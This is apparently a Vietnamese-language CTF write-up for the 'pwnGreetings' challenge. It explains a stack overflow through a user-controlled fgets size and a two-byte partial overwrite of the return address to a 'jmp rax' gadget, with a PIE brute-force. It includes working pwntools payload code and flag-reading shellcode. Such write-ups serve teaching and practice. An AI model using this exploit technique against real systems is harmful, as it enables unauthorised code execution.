# pwnGreetings Writeup

## TL;DR

Bug la stack buffer overflow do size truyen vao `fgets` bi user control:

```c
char uname[64];
scanf("%d", &uname_size);
getchar();
uname_size += 2;
fgets(uname, uname_size, stdin);
```

`uname` chi co 64 byte, nhung `fgets` co the doc qua buffer. Exploit dung:

- shellcode dat ngay trong `uname`
- partial overwrite saved RIP bang 1 byte `0xdf`
- tan dung byte `NUL` ma `fgets` tu append de overwrite byte thu 2 cua RIP
- nhay vao gadget `jmp rax`
- `rax` luc do la return value cua `fgets`, tuc con tro toi `uname`

Do PIE, can brute-force layout co `pie_base low16 == 0xf000`, xac suat khoang `1/16`.

## Phan Tich

Source:

```c
void greetUser() {
    int uname_size;
    char uname[64];
    printf("Enter the size of your username: ");
    scanf("%d", &uname_size);
    getchar();
    uname_size += 2;
    printf("Enter username (start with @): ");
    fgets(uname, uname_size, stdin);
    if (*(char *) uname == '@') {
        printf("Greetings to you: %s!", uname);
    }
}
```

Binary co cac diem quan trong:

- khong co canary
- stack executable
- PIE bat
- co gadget `jmp rax` o offset `0x10df`

Offset tu `uname` toi saved RIP la:

```text
0x48
```

## Y Tuong Exploit

Payload co dang:

```text
shellcode
padding toi 0x48 byte
0xdf
```

Tong payload dai:

```text
0x49 byte
```

Phan size gui vao:

```python
size_input = len(payload) - 1
```

Trong source, `uname_size += 2`, va `fgets(buf, n, stdin)` chi doc toi da `n - 1` byte that. Vi vay:

```text
input size = len(payload) - 1
after += 2 = len(payload) + 1
fgets read max = len(payload)
```

Ket qua la `fgets` doc dung `0x49` byte payload, sau do tu append `\0` vao byte ke tiep.

Saved RIP bi overwrite nhu sau:

- byte thap nhat thanh `0xdf`
- byte tiep theo thanh `0x00` do byte NUL cua `fgets`

Nhu vay low 16-bit cua saved RIP thanh:

```text
0x00df
```

## Vi Sao La jmp rax

Sau khi `fgets` tra ve, theo ABI amd64 return value nam trong `rax`. Return value cua `fgets` la con tro toi buffer dau vao, tuc `uname`.

Neu username khong bat dau bang `@`, nhanh `printf("Greetings...")` khong chay. Luc do register state con thuan loi hon: `rax` van giu pointer toi `uname`.

Ta partial overwrite RIP de return vao:

```asm
jmp rax
```

Gadget nay se nhay thang vao shellcode dang nam trong `uname`.

## Vi Sao Can Brute-Force

Gadget can toi:

```text
pie_base + 0x10df
```

Sau overwrite, low 16-bit cua RIP bi ep thanh:

```text
0x00df
```

De dia chi gadget co low 16-bit la `0x00df`, can:

```text
pie_base low16 = 0xf000
```

PIE base page-aligned nen low 12-bit luon la `0x000`, chi con 1 nibble can brute-force. Xac suat trung:

```text
1 / 16
```

Chi can reconnect va gui lai payload cho toi khi dung layout.

## Shellcode

Exploit dung shellcode doc flag truc tiep:

```python
path = "/flag.txt" if args.REMOTE else "flag.txt"
shellcode = asm(shellcraft.cat(path))
```

`shellcraft.cat(...)` khong phai chay `/bin/cat`; no generate syscall de open file va ghi noi dung ra stdout. Cach nay gon hon `execve("/bin/sh")`, khong phu thuoc shell, va phu hop voi brute-force reconnect.

Shellcode can thoa:

- khong co `\x00`
- khong co `\x0a`
- byte dau khong phai `@`
- do dai <= `0x48`

## Payload Core

```python
OFFSET = 0x48
JMP_RAX_LOW_BYTE = b'\xdf'

payload = flat(
    shellcode,
    b'A' * (OFFSET - len(shellcode)),
    JMP_RAX_LOW_BYTE,
)

size_input = len(payload) - 1
```

Day la cho bien hanh vi append `NUL` cua `fgets` thanh primitive partial overwrite 2 byte.

## Solve

Chay local:

```bash
python3 solve.py
```

Chay remote:

```bash
python3 solve.py REMOTE
```

Loop exploit:

1. Ket noi toi process/remote.
2. Gui size la `len(payload) - 1`.
3. Gui payload.
4. Neu output co flag thi dung.
5. Neu crash/khong trung PIE layout thi reconnect va thu lai.

## Ket Luan

Bai nay la BOF kha gon:

- overflow truc tiep toi saved RIP
- stack executable nen shellcode chay duoc
- khong can leak
- khong overwrite full RIP
- tan dung byte `NUL` cua `fgets`
- dung `jmp rax` vi `rax` dang tro toi buffer

Phan hay nhat la chi sua 2 byte thap cua return address, roi brute-force 1 nibble cua PIE base.
